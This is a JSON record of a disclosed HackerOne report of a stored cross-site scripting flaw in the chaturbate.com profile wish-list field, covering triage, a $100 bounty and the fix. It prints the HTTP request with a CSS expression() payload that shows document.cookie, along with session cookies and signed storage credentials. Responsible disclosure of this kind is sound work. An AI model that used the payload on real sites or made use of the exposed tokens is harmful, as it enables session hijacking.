{"id":425048,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjUwNDg=","url":"https://hackerone.com/reports/425048","title":"Stored XSS on chaturbate.com (wish list)","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-10-17T15:43:11.808Z","submitted_at":"2018-10-17T15:43:11.808Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"glc","url":"/glc","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/824/0f41909d4ed4edf968cecd53f627f130713c99b6_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":30475,"url":"https://hackerone.com/chaturbate","handle":"chaturbate","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Chaturbate","twitter_handle":"chaturbate","website":"https://chaturbate.com","about":"The largest online adult cam site"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-11-06T08:53:07.211Z","bug_reporter_agreed_on_going_public_at":"2018-11-06T08:53:07.046Z","team_member_agreed_on_going_public_at":"2018-11-06T08:13:51.031Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI found a stored XSS on `chaturbate.com`\n\n\n## Description\n\nThe input `wish_list` in the bio of a user allows him/her to enter CSS properties, however some browsers like Opera or Internet Explorer are vulnerable to XSS through the attribute `style`.\n\n__request__\n```http\nPOST /accounts/editbio/ HTTP/1.1\nHost: chaturbate.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nX-CSRFToken: tC7J5FySgWbyelHAfbjULIHHjcBSoaLt\nX-Requested-With: XMLHttpRequest\nReferer: https://chaturbate.com/p/gwen129347565/?tab=bio\nContent-Length: 738\nCookie: __cfduid=d2934f3470865ee3896a47085641d896a1538487853; affkey=\"eJyrViopylayUlBKzU1KTVHSUVBKTEsD8dPLU/MMjSyNTcxNzUxB4gUgUSMQqwjEAjFKQAy/Co80ECc5F6wizSwlKF+pFgDhORXE\"; sbr=\"sec:sbr13ad4f24-5041-4a4c-8750-5f9347349bdf:1gCPeH:kCQ7ZlepO2sJe-PC9TDEjeEJPdY\"; csrftoken=tC7J5FySgWbyelHAfbjULIHHjcBSoaLt; xaduuid=a2ff3d56-7ff3-49bd-a599-b2518d5bac1d; __utma=242100432.1318159749.1538487857.1539770646.1539786223.23; __utmz=242100432.1538487857.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); agreeterms=1; cbv_vol=6; cbv_mute=0; cbv_scale=0; cbv_maxq=8925658; _ga=GA1.2.1318159749.1538487857; latest_linked_timestamp=1539787885610; latest_linked_username=gwen129347565; jtr=n; __utmc=242100432; sessionid=g94j5x81uh623dx5vklse77ghukz6mdm; itu=0; last_username=gwen129347565; broadcast_terms=1; __utmb=242100432.28.10.1539786223; __utmt=1\nConnection: close\n\ncsrfmiddlewaretoken=tC7J5FySgWbyelHAfbjULIHHjcBSoaLt\u0026next=%2Faccounts%2Fshowbio%2F\u0026real_name=aaaa\u0026birthday_month=2\u0026birthday_day=3\u0026birthday_year=1963\u0026gender=f\u0026interested_in=f\u0026location=France\u0026spoken_languages=English\u0026body_type=\u0026smoke_drink=\u0026body_decorations=\u0026about_me=\u0026wish_list=bbbbbb\u003cimg src=\"http://poc.10degres.net/ooo.png\" style=\"width:expression(open(alert(document.cookie)))\"\u003eaaa\n```\n\n__code rendered__\n\n```html\n\u003cdd\u003e\n  \u003cp\u003e\n    bbbbbb\u003cimg src=\"https://camo.stream.highwebmedia.com/8364fb9d5dff33ff76ce3a52b2a302ebd2418e3d/687474703a2f2f706174617472612e676c632e73742f6f6f6f2e706e67\" style=\"width:expression(open(alert(document.cookie)))\" target=\"_blank\" rel=\"nofollow\"\u003eaaa\n  \u003c/p\u003e\n\u003c/dd\u003e\n```\n\n\n## PoC\n\n__tested with Internet Explorer 9.0__\n\nVisit this link:\nhttps://chaturbate.com/p/gwen129347565/?tab=bio\n\n{F362064}\n{F362063}\n\n## Impact\n\n- hostile code insertion\n- session hijacking\n- user browser corruption\n\n\n## Remediation\n\nEncode special characters like `'` `\"` `\u003c` `\u003e`\nDo not allow CSS properties\nRemove keywords like `expression`\n\n## See also\n\nhttps://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)\nhttps://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005)\n\n\nBest regards,\n\nGwen","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":362063,"file_name":"20181017-xss-cssbio2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/362/063/ab2a82a01a12e738869f1e28e8facd84fae0ccbf/20181017-xss-cssbio2.png?response-content-disposition=attachment%3B%20filename%3D%2220181017-xss-cssbio2.png%22%3B%20filename%2A%3DUTF-8%27%2720181017-xss-cssbio2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145910Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3a921a960f35f9ad26f4ae3da28a9326054bb1e5cff17cd70ba9c33248793ed8","file_size":213985,"type":"image/png"}],"allow_singular_disclosure_at":"2018-12-06T08:13:51.130Z","allow_singular_disclosure_after":-89880319.03474776,"singular_disclosure_allowed":true,"vote_count":17,"voters":["sameerphad72","ali","powerjacobb1","eveeez","whitesector","pandaonair","booleanaire","japz","k_outis","cryptographer","and 7 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":{"databaseId":11722,"asset_type":"URL","asset_identifier":"https://chaturbate.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3493773,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please note that the parameter `about_me` may also be vulnerable.","automated_response":false,"created_at":"2018-10-17T15:50:15.811Z","updated_at":"2018-10-17T15:50:15.811Z","actor":{"username":"glc","cleared":false,"url":"/glc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/824/0f41909d4ed4edf968cecd53f627f130713c99b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3495441,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-10-17T21:58:03.429Z","updated_at":"2018-10-17T21:58:03.429Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":225639},"actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3495457,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report. After testing I found this only affects IE9 if they have compatibility mode enabled, since it was only a feature in IE7 and lower. This therefore only affects \u003c 0.5% of our users. Usually this would be excluded as per our policy but we will apply a patch for this in this case.","automated_response":false,"created_at":"2018-10-17T22:01:00.792Z","updated_at":"2018-10-17T22:01:00.792Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3495459,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-10-17T22:01:05.715Z","updated_at":"2018-10-17T22:01:05.715Z","actor":{"url":"/chaturbate","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Chaturbate"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"chaturbate","collaborator":{"username":"glc","url":"/glc"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3497348,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes the target spectrum is pretty small. Thanks for the bounty :)","automated_response":false,"created_at":"2018-10-18T08:49:41.064Z","updated_at":"2018-10-18T08:49:41.064Z","actor":{"username":"glc","cleared":false,"url":"/glc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/824/0f41909d4ed4edf968cecd53f627f130713c99b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3501109,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This is now resolved, thanks again for your report!","automated_response":false,"created_at":"2018-10-19T00:55:28.165Z","updated_at":"2018-10-19T00:55:28.165Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"glc","url":"/glc"},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3519346,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I see that my payload has been filtered :)\nThumbs up!","automated_response":false,"created_at":"2018-10-23T08:58:57.013Z","updated_at":"2018-10-23T08:58:57.013Z","actor":{"username":"glc","cleared":false,"url":"/glc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/824/0f41909d4ed4edf968cecd53f627f130713c99b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3591767,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-11-06T08:13:51.070Z","updated_at":"2018-11-06T08:13:51.070Z","first_to_agree":true,"actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3592155,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Public disclosure.","automated_response":false,"created_at":"2018-11-06T08:53:07.078Z","updated_at":"2018-11-06T08:53:07.078Z","actor":{"username":"glc","cleared":false,"url":"/glc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/824/0f41909d4ed4edf968cecd53f627f130713c99b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3592156,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-11-06T08:53:07.235Z","updated_at":"2018-11-06T08:53:07.235Z","actor":{"username":"glc","cleared":false,"url":"/glc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/824/0f41909d4ed4edf968cecd53f627f130713c99b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}